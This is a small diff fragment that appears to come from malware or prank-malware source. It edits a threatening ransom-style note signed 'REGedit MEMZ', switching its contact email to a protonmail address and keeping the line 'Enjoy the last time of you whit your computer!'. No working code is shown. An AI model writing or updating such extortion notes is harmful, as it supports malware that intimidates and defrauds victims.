@@ -80,7 +80,7 @@ set Note {
 
  I will generate a random code for you!
 
- Email:REGedit MEMZ@126.com
+ Email:REGedit MEMZ@protonmail.com
  Enjoy the last time of you whit your computer!
  
  Creator: REGedit MEMZ
